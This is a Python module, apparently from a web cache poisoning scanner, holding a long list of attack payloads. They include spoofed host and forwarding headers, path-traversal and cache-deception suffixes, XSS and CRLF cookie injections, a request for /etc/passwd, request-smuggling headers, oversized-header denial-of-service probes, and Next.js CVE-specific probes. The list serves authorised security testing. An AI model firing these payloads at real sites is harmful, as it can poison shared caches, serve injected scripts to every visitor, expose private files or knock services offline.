from typing import List, Dict

def get_all_signatures(payload_id: str) -> List[Dict]:
    """
    Returns a comprehensive list of cache poisoning signatures.
    Payload ID is injected into values to allow tracking.
    """
    return [
        # --- Standard Host Header Manipulation ---
        {"name": "X-Forwarded-Host", "header": "X-Forwarded-Host", "value": f"evil-{payload_id}.com"},
        {"name": "X-Host", "header": "X-Host", "value": f"evil-{payload_id}.com"},
        {"name": "X-Forwarded-Server", "header": "X-Forwarded-Server", "value": f"evil-{payload_id}.com"},
        {"name": "X-HTTP-Host-Override", "header": "X-HTTP-Host-Override", "value": f"evil-{payload_id}.com"},
        {"name": "Forwarded", "header": "Forwarded", "value": f"host=evil-{payload_id}.com;for=127.0.0.1"},
        {"name": "Host-Port-Mismatch", "header": "Host", "value": f"victim.com:1337"},  # New
        
        # --- Request Line / Path Overrides ---
        {"name": "X-Original-URL", "header": "X-Original-URL", "value": f"/poison-{payload_id}"},
        {"name": "X-Rewrite-URL", "header": "X-Rewrite-URL", "value": f"/poison-{payload_id}"},
        {"name": "X-Original-Request-URI", "header": "X-Original-Request-URI", "value": f"/poison-{payload_id}"},
        
        # --- Protocol / Port Manipulation ---
        {"name": "X-Forwarded-Scheme", "type": "method_override", "header": "X-Forwarded-Scheme", "value": "http"},
        {"name": "X-Forwarded-Proto", "type": "method_override", "header": "X-Forwarded-Proto", "value": "http"},
        {"name": "X-Forwarded-Port", "header": "X-Forwarded-Port", "value": "1111"},
        {"name": "X-Forwarded-Port-80", "header": "X-Forwarded-Port", "value": "80"},   # New
        {"name": "X-Forwarded-Port-8080", "header": "X-Forwarded-Port", "value": "8080"}, # New
        {"name": "X-Forwarded-Prefix", "header": "X-Forwarded-Prefix", "value": f"/evil-{payload_id}"},
        
        # --- Web Cache Deception (WCD) Extended ---
        {"name": "WCD-Static-Ext", "type": "path", "mutation": "static_extension", "value": f"/style.css?poison={payload_id}"},
        {"name": "WCD-Append-CSS", "type": "path", "mutation": "append_css", "value": f"/static/style.css?poison={payload_id}"},
        {"name": "WCD-Path-Delimiter-Semicolon", "type": "path", "mutation": "simple_append", "value": ";.css"}, # New
        {"name": "WCD-Path-Delimiter-Question", "type": "path", "mutation": "simple_append", "value": "?.jpg"},  # New
        {"name": "WCD-Encoded-Newline", "type": "path", "mutation": "simple_append", "value": "%0A.css"},    # New
        {"name": "WCD-Fragment-Bypass", "type": "path", "mutation": "simple_append", "value": "#.css"},      # New
        {"name": "WCD-Null-Byte", "type": "path", "mutation": "simple_append", "value": "%00.css"},          # New

        # --- HTTP/2 Pseudo-Headers (Requires compatible client) ---
        {"name": "HTTP2-Authority-Override", "type": "http2_header", "header": ":authority", "value": f"evil-{payload_id}.com"},
        {"name": "HTTP2-Path-Override", "type": "http2_header", "header": ":path", "value": f"/../admin?poison={payload_id}"},
        {"name": "HTTP2-Method-CONNECT", "type": "http2_header", "header": ":method", "value": "CONNECT"},

        # --- Header Reflection / Injection targets ---
        {"name": "Valid-User-Agent", "header": "User-Agent", "value": f"<script>alert('{payload_id}')</script>"},
        {"name": "Origin-Reflect", "header": "Origin", "value": f"https://evil-{payload_id}.com"},
        {"name": "Accept-Language", "header": "Accept-Language", "value": f"en-evil-{payload_id}"},
        
        # --- Path Normalization / Traversal ---
        {"name": "Backslash-Path-Replace", "type": "path", "mutation": "backslash_replace"},
        {"name": "Backslash-Last-Path-Replace", "type": "path", "mutation": "backslash_last_slash"},
        {"name": "Path-Dot-Segment", "type": "path", "mutation": "dot_segment", "value": f"/./poison-{payload_id}"},
        {"name": "Path-Double-Dot", "type": "path", "mutation": "double_dot", "value": f"/../poison-{payload_id}"},
        {"name": "Path-Encoded-Slash", "type": "path", "mutation": "encoded_slash", "value": f"/%2fpoison-{payload_id}"},
        {"name": "Path-Trailing-Slash-Add", "type": "path", "mutation": "add_trailing_slash"},      # New
        {"name": "Path-Trailing-Slash-Remove", "type": "path", "mutation": "remove_trailing_slash"}, # New
        {"name": "Path-Double-Slash", "type": "path", "mutation": "double_slash_prefix", "value": "//poison"}, # New

        # --- Fat GET (Body Poisoning) ---
        {"name": "Fat-GET", "type": "fat_get", "header": "X-Poison-Fat", "value": f"evil-{payload_id}"},

        # --- CDN / IP Forwarding ---
        {"name": "Fastly-Client-IP", "header": "Fastly-Client-IP", "value": "8.8.8.8"},
        {"name": "True-Client-IP", "header": "True-Client-IP", "value": "127.0.0.1"},
        {"name": "CF-Connecting-IP", "header": "CF-Connecting-IP", "value": "127.0.0.1"},
        {"name": "X-Real-IP", "header": "X-Real-IP", "value": "127.0.0.1"},
        {"name": "X-Forwarded-For-IP", "header": "X-Forwarded-For", "value": "127.0.0.1"},
        {"name": "Client-IP", "header": "Client-IP", "value": "127.0.0.1"},
        {"name": "X-Akamai-Edgescape", "header": "X-Akamai-Edgescape", "value": f"poison={payload_id}"},
        {"name": "X-Azure-ClientIP", "header": "X-Azure-ClientIP", "value": "127.0.0.1"},
        {"name": "X-Azure-SocketIP", "header": "X-Azure-SocketIP", "value": "127.0.0.1"},
        
        # --- Method Override ---
        {"name": "Method-Override-POST", "type": "method_override", "header": "X-HTTP-Method-Override", "value": "POST"},
        {"name": "Method-Override-PUT", "type": "method_override", "header": "X-HTTP-Method-Override", "value": "PUT"},

        # --- Unkeyed Query Parameter ---
        {"name": "Unkeyed-Param", "type": "query_param", "param": "utm_content", "value": f"evil-{payload_id}"},
        {"name": "Parameter-Pollution", "type": "query_param", "param": "utm_source", "value": f"evil-{payload_id}"},
        {"name": "GraphQL-Query-Pollution", "type": "query_param", "param": "query", "value": f"{{__typename poison:{payload_id}}}"}, # New
        {"name": "GraphQL-OperationName", "type": "query_param", "param": "operationName", "value": f"<svg onload=alert('{payload_id}')>"}, # New

        # --- Extended Header Reflection ---
        {"name": "X-Forwarded-SSL", "header": "X-Forwarded-SSL", "value": f"on-{payload_id}"},
        {"name": "X-Cluster-Client-IP", "header": "X-Cluster-Client-IP", "value": "127.0.0.1"},
        {"name": "Akamai-Pragma", "header": "Pragma", "value": "akamai-x-cache-on"},
        {"name": "Referer-Reflect", "header": "Referer", "value": f"https://evil-{payload_id}.com"},
        {"name": "Cache-Control-Poison", "header": "Cache-Control", "value": "public, max-age=3600"},
        {"name": "X-Original-Host", "header": "X-Original-Host", "value": f"evil-{payload_id}.com"},
        {"name": "X-Forwarded-Path", "header": "X-Forwarded-Path", "value": f"/poison-{payload_id}"},
        {"name": "Surrogate-Control", "header": "Surrogate-Control", "value": "max-age=3600"},
        {"name": "Vary-Manipulation", "header": "Vary", "value": "X-Forwarded-Host"},
        {"name": "Accept-Encoding-Reflect", "header": "Accept-Encoding", "value": f"evil-{payload_id}"},
        {"name": "TE-Trailers", "type": "method_override", "header": "Transfer-Encoding", "value": "trailers"},
        {"name": "CRLF-Injection", "header": "X-Custom-Header", "value": f"%0d%0aSet-Cookie: evil={payload_id}"},
        
        # --- Cookies ---
        {"name": "HAV-Cookie-Reflect", "header": "hav", "value": f"<script>alert('{payload_id}')</script>"},
        {"name": "Cookie-Reflection-Session", "header": "Cookie", "value": f"session=<script>alert('{payload_id}')</script>"}, # New 
        {"name": "Cookie-HMO", "header": "Cookie", "value": f"_method=PUT; poison={payload_id}"}, # New
        {"name": "Cookie-Vary", "header": "Cookie", "value": f"cache_poison=\"{payload_id}\""},

        # --- Vercel / Next.js ---
        {"name": "Vercel-IP-Country-US", "type": "method_override", "header": "x-vercel-ip-country", "value": "US"},
        {"name": "Vercel-Forwarded-For", "type": "method_override", "header": "x-vercel-forwarded-for", "value": "127.0.0.1"},
        {"name": "NextJS-RSC", "type": "method_override", "header": "RSC", "value": "1"},
        {"name": "NextJS-Router-State", "type": "method_override", "header": "Next-Router-State-Tree", "value": "1"},
        {"name": "NextJS-Middleware-Prefetch", "type": "method_override", "header": "X-Middleware-Prefetch", "value": "1"},
        {"name": "X-Middleware-Prefetch-Poison", "type": "method_override", "header": "X-Middleware-Prefetch", "value": "poison"},
        {"name": "NextJS-Data", "type": "method_override", "header": "X-Nextjs-Data", "value": "1"},
        {"name": "NextJS-Purpose-Prefetch", "type": "method_override", "header": "Purpose", "value": "prefetch"},
        {"name": "NextJS-Cache-Poison", "type": "method_override", "header": "Next-Router-Prefetch", "value": "1"},
        {"name": "NextJS-Next-Url", "header": "x-next-url", "value": f"/evil-{payload_id}"},

        # --- Range / DoS ---
        {"name": "Range-Poisoning", "type": "method_override", "header": "Range", "value": "bytes=0-0"},
        
        # --- CloudFront & AWS ---
        {"name": "CloudFront-Viewer-Country", "method_override": "true", "header": "CloudFront-Viewer-Country", "value": "US"},
        {"name": "CloudFront-Is-Mobile", "type": "method_override", "header": "CloudFront-Is-Mobile-Viewer", "value": "true"},
        {"name": "CloudFront-Is-Desktop", "type": "method_override", "header": "CloudFront-Is-Desktop-Viewer", "value": "true"},
        {"name": "CloudFront-Forwarded-Proto", "type": "method_override", "header": "CloudFront-Forwarded-Proto", "value": "http"},
        {"name": "AWS-S3-Redirect", "header": "x-amz-website-redirect-location", "value": f"/evil-{payload_id}"},

        # --- Service Worker / Socket ---
        {"name": "ServiceWorker-Script-Injection", "header": "Service-Worker-Allowed", "value": "/"}, # New
        {"name": "ServiceWorker-Scope-Poison", "header": "X-Service-Worker-Scope", "value": "/admin"}, # New
        {"name": "WebSocket-Upgrade-Poison", "header": "Upgrade", "value": f"websocket\r\nX-Poison: {payload_id}"}, # New
        {"name": "WebSocket-Key-Poison", "header": "Sec-WebSocket-Key", "value": f"base64evil{payload_id}=="}, # New

        # --- CPDoS (Cache Poisoning Denial of Service) ---
        {"name": "CPDoS-HMO-Connect", "type": "method_override", "header": "X-HTTP-Method-Override", "value": "CONNECT"},
        {"name": "CPDoS-HMO-Track", "type": "method_override", "header": "X-HTTP-Method-Override", "value": "TRACK"},
        {"name": "CPDoS-HHO-Oversize", "type": "method_override", "header": "X-Oversized-Header", "value": "A" * 4000},

        # --- Frameworks ---
        {"name": "IIS-Translate-F", "header": "Translate", "value": "f"},
        {"name": "Symfony-Debug-Host", "header": "X-Backend-Host", "value": f"evil-{payload_id}.com"},
        {"name": "Magento-Base-Url", "header": "X-Forwarded-Base-Url", "value": f"http://evil-{payload_id}.com"},
        {"name": "X-Laravel-Cache", "header": "X-Laravel-Cache", "value": f"poison-{payload_id}"},
        {"name": "X-Drupal-Cache", "header": "X-Drupal-Cache", "value": f"poison-{payload_id}"},
        {"name": "X-WordPress-Cache", "header": "X-WordPress-Cache", "value": f"poison-{payload_id}"},

        # --- Proxy/LB ---
        {"name": "X-ProxyUser-Ip", "header": "X-ProxyUser-Ip", "value": "127.0.0.1"},
        {"name": "WL-Proxy-Client-IP", "header": "WL-Proxy-Client-IP", "value": "127.0.0.1"},
        {"name": "Via-Header", "header": "Via", "value": f"1.1 poison-{payload_id}.com"},
        
        # --- API Gateway ---
        {"name": "X-Amzn-Trace-Id", "header": "X-Amzn-Trace-Id", "value": f"Root=1-{payload_id}"},
        {"name": "X-API-Version", "header": "X-API-Version", "value": f"poison-{payload_id}"},
        {"name": "X-Gateway-Host", "header": "X-Gateway-Host", "value": f"evil-{payload_id}.com"},

        # --- URL Encoding Bypass ---
        {"name": "X-Forwarded-Host-Encoded", "header": "X-Forwarded-Host", "value": f"evil-{payload_id}.com%00"},
        {"name": "X-Original-URL-Encoded", "header": "X-Original-URL", "value": f"/%2e%2e/poison-{payload_id}"},
        
        # --- Request Smuggling Related ---
        {"name": "Transfer-Encoding", "type": "method_override", "header": "Transfer-Encoding", "value": f"chunked; poison={payload_id}"},
        {"name": "Content-Length-Mismatch", "type": "method_override", "header": "Content-Length", "value": "0"},
        {"name": "X-HTTP-Method", "type": "method_override", "header": "X-HTTP-Method", "value": f"POST; poison={payload_id}"},
        
        # --- Exotic / Out-of-the-Box Signatures ---
        # Time-based manipulation
        {"name": "Date-Backdating", "type": "exotic", "header": "Date", "value": "Mon, 01 Jan 2020 00:00:00 GMT"},
        {"name": "Date-Future", "type": "exotic", "header": "Date", "value": "Wed, 01 Jan 2099 00:00:00 GMT"},
        {"name": "If-Modified-Since-Future", "type": "exotic", "header": "If-Modified-Since", "value": "Wed, 01 Jan 2099 00:00:00 GMT"},
        {"name": "If-Modified-Since-Epoch", "type": "exotic", "header": "If-Modified-Since", "value": "Thu, 01 Jan 1970 00:00:00 GMT"},
        {"name": "If-None-Match-Fake", "type": "exotic", "header": "If-None-Match", "value": f'"{payload_id}"'},
        {"name": "If-None-Match-Wildcard", "type": "exotic", "header": "If-None-Match", "value": "*"},
        
        # Hop-by-hop exploitation
        {"name": "Connection-XFH", "type": "exotic", "header": "Connection", "value": "close, X-Forwarded-Host"},
        {"name": "Connection-XFF", "type": "exotic", "header": "Connection", "value": "close, X-Forwarded-For"},
        {"name": "Connection-Cookie", "type": "exotic", "header": "Connection", "value": "close, Cookie"},
        {"name": "Connection-XOrigURL", "type": "exotic", "header": "Connection", "value": "close, X-Original-URL"},
        
        # Early hints / Link header injection
        {"name": "Link-Preload-Script", "type": "exotic", "header": "Link", "value": f"</evil-{payload_id}.js>; rel=preload; as=script"},
        {"name": "Link-Preload-Style", "type": "exotic", "header": "Link", "value": f"</evil-{payload_id}.css>; rel=preload; as=style"},
        {"name": "Link-DNS-Prefetch", "type": "exotic", "header": "Link", "value": f"<https://evil-{payload_id}.com>; rel=dns-prefetch"},
        
        # Accept header edge cases
        {"name": "Accept-Q-Edge", "type": "exotic", "header": "Accept", "value": "text/*;q=0.001, */*;q=0"},
        {"name": "Accept-Invalid-MIME", "type": "exotic", "header": "Accept", "value": f"text/html-{payload_id}"},
        {"name": "Accept-Wildcard-Payload", "type": "exotic", "header": "Accept", "value": f"*/*; {payload_id}"},
        {"name": "Accept-JSON-Override", "type": "exotic", "header": "Accept", "value": "application/json"},
        
        # Age/Warning manipulation
        {"name": "Age-Zero", "type": "exotic", "header": "Age", "value": f"0-{payload_id}"},
        {"name": "Age-Max", "type": "exotic", "header": "Age", "value": f"2147483647-{payload_id}"},
        {"name": "Warning-Stale", "type": "exotic", "header": "Warning", "value": f'110 - "Response is stale {payload_id}"'},
        
        # Internal redirect headers (nginx/apache)
        {"name": "X-Accel-Redirect", "type": "exotic", "header": "X-Accel-Redirect", "value": f"/internal/secret?p={payload_id}"},
        {"name": "X-Sendfile", "type": "exotic", "header": "X-Sendfile", "value": f"/app/secret-{payload_id}.txt"},
        {"name": "X-Lighttpd-Send-File", "type": "exotic", "header": "X-Lighttpd-Send-File", "value": f"/etc/passwd"},
        
        # Content negotiation confusion
        {"name": "Content-Type-HTML", "type": "exotic", "header": "Content-Type", "value": "text/html"},
        {"name": "Content-Encoding-Identity", "type": "exotic", "header": "Content-Encoding", "value": "identity"},
        {"name": "Accept-Encoding-Poison", "type": "exotic", "header": "Accept-Encoding", "value": f"gzip, deflate, {payload_id}"},
        
        # HTTP/1.0 downgrade
        {"name": "HTTP10-Connection", "type": "exotic", "header": "Connection", "value": "close"},
        {"name": "HTTP10-Version", "type": "exotic", "header": "X-HTTP-Version", "value": "1.0"},
        
        # Cache key bypass attempts
        {"name": "X-Cache-Key-Bypass", "type": "exotic", "header": "X-Cache-Key", "value": "bypass-true"},
        {"name": "X-Cache-Hash", "type": "exotic", "header": "X-Cache-Hash", "value": f"{payload_id}"},
        {"name": "Cache-Control-Override", "type": "exotic", "header": "Cache-Control", "value": "no-transform, public"},

        # ===== NEW: CDN-Specific Headers =====
        # BunnyCDN
        {"name": "Bunny-Client-IP", "header": "Bunny-Client-IP", "value": f"evil-{payload_id}.com"},
        {"name": "CDN-Country", "header": "CDN-Country", "value": f"evil-{payload_id}"},
        {"name": "Bunny-Latitude", "header": "Bunny-Latitude", "value": f"evil-{payload_id}"},

        # Azure CDN / Azure Front Door
        {"name": "X-Azure-FDID", "header": "X-Azure-FDID", "value": f"evil-{payload_id}.com"},
        {"name": "X-Azure-RequestChain", "header": "X-Azure-RequestChain", "value": f"Proxy1,evil-{payload_id}.com"},
        {"name": "X-Azure-Ref", "header": "X-Azure-Ref", "value": f"evil-{payload_id}"},
        {"name": "X-FD-HealthProbe", "header": "X-FD-HealthProbe", "value": f"evil-{payload_id}"},

        # Edgio (formerly Limelight / Verizon CDN)
        {"name": "X-EC-Debug", "header": "X-EC-Debug", "value": f"evil-{payload_id}"},
        {"name": "X-EC-Geo-Country", "header": "X-EC-Geo-Country", "value": f"evil-{payload_id}"},
        {"name": "LL-Forwarded-For", "header": "LL-Forwarded-For", "value": f"evil-{payload_id}.com"},

        # StackPath CDN
        {"name": "X-SP-Edge-Host", "header": "X-SP-Edge-Host", "value": f"evil-{payload_id}.com"},
        {"name": "X-SP-Forwarded-Host", "header": "X-SP-Forwarded-Host", "value": f"evil-{payload_id}.com"},
        {"name": "X-SP-Country-Code", "header": "X-SP-Country-Code", "value": f"evil-{payload_id}"},

        # Sucuri WAF / CDN
        {"name": "X-Sucuri-Clientip", "header": "X-Sucuri-Clientip", "value": "127.0.0.1"},
        {"name": "X-Sucuri-Country", "header": "X-Sucuri-Country", "value": f"evil-{payload_id}"},

        # G-Core Labs CDN
        {"name": "X-Geoip-Country", "header": "X-Geoip-Country", "value": f"evil-{payload_id}"},
        {"name": "X-Geoip-City", "header": "X-Geoip-City", "value": f"evil-{payload_id}"},

        # Imperva / Incapsula
        {"name": "Incap-Client-IP", "header": "Incap-Client-IP", "value": "127.0.0.1"},
        {"name": "X-Iinfo", "header": "X-Iinfo", "value": f"evil-{payload_id}"},

        # KeyCDN
        {"name": "X-Pull", "header": "X-Pull", "value": f"evil-{payload_id}"},
        {"name": "X-Cdn", "header": "X-Cdn", "value": f"KeyCDN-evil-{payload_id}"},

        # Netlify CDN
        {"name": "X-Nf-Request-Id", "header": "X-Nf-Request-Id", "value": f"evil-{payload_id}"},
        {"name": "X-Netlify-Original-Pathname", "header": "X-Netlify-Original-Pathname", "value": f"/evil-{payload_id}"},

        # ===== NEW: Network Information / Client Hints Headers =====
        # These headers are increasingly unkeyed but may affect responses (geolocation, device adaptation)
        {"name": "DPR", "header": "DPR", "value": f"2.0-{payload_id}"},
        {"name": "Width", "header": "Width", "value": f"9999-{payload_id}"},
        {"name": "Viewport-Width", "header": "Viewport-Width", "value": f"9999-{payload_id}"},
        {"name": "Save-Data", "header": "Save-Data", "value": f"on-{payload_id}"},
        {"name": "RTT", "header": "RTT", "value": f"999-{payload_id}"},
        {"name": "Downlink", "header": "Downlink", "value": f"99-{payload_id}"},
        {"name": "ECT", "header": "ECT", "value": f"slow-2g-{payload_id}"},
        {"name": "Device-Memory", "header": "Device-Memory", "value": f"0.5-{payload_id}"},

        # ===== NEW: Fetch Metadata / Client Hint Headers =====
        # Browser-sent headers that may be unkeyed at CDN but affect responses
        {"name": "Sec-Fetch-Site", "header": "Sec-Fetch-Site", "value": f"cross-site-evil-{payload_id}"},
        {"name": "Sec-Fetch-Mode", "header": "Sec-Fetch-Mode", "value": f"navigate-evil-{payload_id}"},
        {"name": "Sec-CH-UA-Platform", "header": "Sec-CH-UA-Platform", "value": f'"evil-{payload_id}"'},
        {"name": "Sec-CH-UA-Mobile", "header": "Sec-CH-UA-Mobile", "value": "?1"},
        {"name": "Sec-CH-UA-Full-Version-List", "header": "Sec-CH-UA-Full-Version-List", "value": f'"evil-{payload_id}";v="999"'},
        {"name": "Sec-Purpose", "header": "Sec-Purpose", "value": f"prefetch;evil-{payload_id}"},
        {"name": "Sec-CH-Prefers-Color-Scheme", "header": "Sec-CH-Prefers-Color-Scheme", "value": f"evil-{payload_id}"},

        # ===== NEW: HTTP Upgrade / Protocol Switching =====
        # Upgrade headers may be unkeyed; malformed values can trigger cached errors
        {"name": "Upgrade-h2c", "type": "exotic", "header": "Upgrade", "value": "h2c"},
        {"name": "Upgrade-SPDY", "type": "exotic", "header": "Upgrade", "value": "SPDY/3.1"},
        {"name": "Upgrade-TLS", "type": "exotic", "header": "Upgrade", "value": f"TLS/1.0-{payload_id}"},
        {"name": "Protocol-Header", "header": "Protocol", "value": f"evil-{payload_id}.com"},
        {"name": "HTTP2-Settings-Poison", "type": "exotic", "header": "HTTP2-Settings", "value": f"AAMAAABkAAQAAP__-{payload_id}"},

        # ===== NEW: HTTP/2 Priority Headers =====
        {"name": "Priority-Urgent", "type": "exotic", "header": "Priority", "value": f"u=0, i"},
        {"name": "Priority-Low", "type": "exotic", "header": "Priority", "value": f"u=5"},

        # ===== NEW: CORS / Cross-Origin Headers =====
        # Origin may be unkeyed; if ACAO reflects the value, it can be cached
        {"name": "CORS-Origin-Poison", "header": "Origin", "value": f"https://evil-{payload_id}.com"},
        {"name": "CORS-ACRM", "header": "Access-Control-Request-Method", "value": f"EVIL-{payload_id}"},
        {"name": "CORS-ACRH", "header": "Access-Control-Request-Headers", "value": f"x-evil-{payload_id}"},

        # ===== NEW: Additional CPDoS Signatures =====
        # These trigger error responses at strict HTTP parsers that some caches store
        {"name": "CPDoS-Large-Accept-Encoding", "type": "exotic", "header": "Accept-Encoding", "value": "gzip" + ("," * 500) + "deflate"},
        {"name": "CPDoS-Meta-Char-Accept-Encoding", "type": "exotic", "header": "Accept-Encoding", "value": "gzip\x00deflate"},
        {"name": "CPDoS-Invalid-TE-Chunked", "type": "method_override", "header": "Transfer-Encoding", "value": "chunked\x0b"},
        {"name": "CPDoS-Large-Cookie", "type": "exotic", "header": "Cookie", "value": "sess=" + "x" * 4097},
        {"name": "CPDoS-Oversized-UA", "type": "exotic", "header": "User-Agent", "value": "Mozilla/5.0 " + "X" * 8192},

        # ===== NEW: Server-Timing / Cache Metadata Manipulation =====
        {"name": "Server-Timing-Poison", "type": "exotic", "header": "Server-Timing", "value": f"cdn-cache; desc=evil-{payload_id}"},
        {"name": "Timing-Allow-Origin", "type": "exotic", "header": "Timing-Allow-Origin", "value": f"https://evil-{payload_id}.com"},

        # ===== NEW: Content Negotiation Expansion =====
        {"name": "Accept-CH-Poison", "header": "Accept-CH", "value": f"DPR, Width, evil-{payload_id}"},
        {"name": "Accept-Ranges-Poison", "type": "exotic", "header": "Accept-Ranges", "value": f"evil-{payload_id}"},

        # ===== NEW: Miscellaneous Modern Headers =====
        {"name": "X-Request-ID-Poison", "header": "X-Request-ID", "value": f"evil-{payload_id}"},
        {"name": "X-Correlation-ID-Poison", "header": "X-Correlation-ID", "value": f"evil-{payload_id}"},
        {"name": "Traceparent-Poison", "header": "Traceparent", "value": f"00-{payload_id}aabbccddeeff0011-aabbccdd-01"},
        {"name": "Cdn-Loop-Poison", "header": "Cdn-Loop", "value": f"evil-{payload_id}"},
        {"name": "True-Client-IP-Poison", "header": "True-Client-IP", "value": f"evil-{payload_id}.com"},

        # ===== CVE-2026: Next.js Cache Poisoning (next-16.2.4-pocs) =====

        # CVE-2026-44572: x-nextjs-data redirect cache poisoning
        # Sending x-nextjs-data: 1 to redirect endpoints causes 200 OK with x-nextjs-redirect
        # header instead of proper 307 redirect. CDN caches the broken 200 response.
        {"name": "NextJS-XData-Redirect-Poison", "header": "x-nextjs-data", "value": "1",
         "cve": "CVE-2026-44572"},
        {"name": "NextJS-XData-Redirect-Poison-Alt", "type": "method_override", "header": "x-nextjs-data", "value": "1",
         "cve": "CVE-2026-44572"},

        # CVE-2026-44576: RSC/HTML cache confusion
        # Spoofed RSC header causes server to render RSC payload but cache classifies it
        # as HTML due to URL suffix check failing on query strings. CDN serves binary RSC
        # data as text/html to all users.
        {"name": "NextJS-RSC-Cache-Confusion", "header": "RSC", "value": "text/x-component",
         "cve": "CVE-2026-44576"},
        {"name": "NextJS-RSC-Cache-Confusion-Loose", "header": "RSC", "value": "true",
         "cve": "CVE-2026-44576"},
        {"name": "NextJS-RSC-Spoofed-With-Prefetch", "header": "RSC", "value": "1",
         "cve": "CVE-2026-44576"},

        # CVE-2026-44582: Weak _rsc cache-busting hash (32-bit MurmurHash collision)
        # _rsc parameter uses weak 32-bit hash — brute-force collision in ~2^16 attempts.
        # Attacker crafts headers that produce same _rsc hash but different RSC payload.
        {"name": "NextJS-RSC-Hash-Collision-Prefetch", "header": "Next-Router-Prefetch", "value": "1",
         "cve": "CVE-2026-44582"},
        {"name": "NextJS-RSC-Hash-Collision-Segment", "header": "Next-Router-Segment-Prefetch", "value": f"__PAGE__-{payload_id}",
         "cve": "CVE-2026-44582"},

        # CVE-2026-44575: App Router middleware bypass via .rsc suffix
        # Middleware regex doesn't match .rsc transport suffix, bypassing auth checks.
        # RSC payload with sensitive data gets cached.
        {"name": "NextJS-RSC-Suffix-Bypass", "type": "path", "mutation": "simple_append", "value": ".rsc",
         "cve": "CVE-2026-44575"},
        {"name": "NextJS-Segment-Prefetch-Bypass", "type": "path", "mutation": "simple_append",
         "value": ".segments/$c$children/__PAGE__.segment.rsc",
         "cve": "CVE-2026-44575"},

        # CVE-2026-44573: i18n data-route bypass
        # Pages Router i18n data-route without locale prefix bypasses middleware.
        # Combined with x-nextjs-data header for full bypass.
        {"name": "NextJS-i18n-DataRoute-Bypass", "header": "x-nextjs-data", "value": "1",
         "cve": "CVE-2026-44573"},

        # CVE-2026-44574: nxtP parameter injection for cache key confusion
        # Injecting nxtP* query params causes middleware/renderer mismatch.
        # Different renders cached under same canonical URL.
        {"name": "NextJS-nxtP-Param-Inject", "type": "query_param", "param": "nxtPslug",
         "value": f"evil-{payload_id}", "cve": "CVE-2026-44574"},
        {"name": "NextJS-nxtI-Param-Inject", "type": "query_param", "param": "nxtIslug",
         "value": f"evil-{payload_id}", "cve": "CVE-2026-44574"},
        {"name": "NextJS-Private-No-Middleware", "type": "query_param",
         "param": "__NEXT_PRIVATE_NO_MIDDLEWARE_RUN", "value": "1",
         "cve": "CVE-2026-44574"},

        # CVE-2026-44579: next-resume header injection (cache poisoning + DoS)
        # Unfiltered next-resume header triggers PPR resume codepath.
        # Resume-rendered response differs from normal render; cached for all users.
        {"name": "NextJS-Resume-Poison", "header": "next-resume", "value": "1",
         "cve": "CVE-2026-44579"},
        {"name": "NextJS-Resume-State-Poison", "header": "x-next-resume-state-length",
         "value": f"999-{payload_id}", "cve": "CVE-2026-44579"},

        # CVE-2026-44578: WebSocket upgrade SSRF (cache poisoning side-effect)
        # Absolute-URL WebSocket upgrade bypasses route resolution.
        # If rejection gets cached, DoS for all users.
        {"name": "NextJS-WS-Upgrade-SSRF", "type": "exotic", "header": "Upgrade", "value": "websocket",
         "cve": "CVE-2026-44578"},

        # CVE-2026-44581: CSP nonce injection → cached XSS
        # Malformed CSP nonce in request header reflects into cached HTML attributes.
        {"name": "NextJS-CSP-Nonce-Inject", "header": "Content-Security-Policy",
         "value": f"script-src 'nonce-\" onerror=\"alert({payload_id})'",
         "cve": "CVE-2026-44581"},

        # CVE-2026-23870: Server-action stream DoS (cache poisoning side-effect)
        # Malformed RSC action body triggers CPU/memory exhaustion.
        # Error response may be cached.
        {"name": "NextJS-Action-DoS", "type": "method_override", "header": "Next-Action",
         "value": "0" * 40, "cve": "CVE-2026-23870"},
    ]
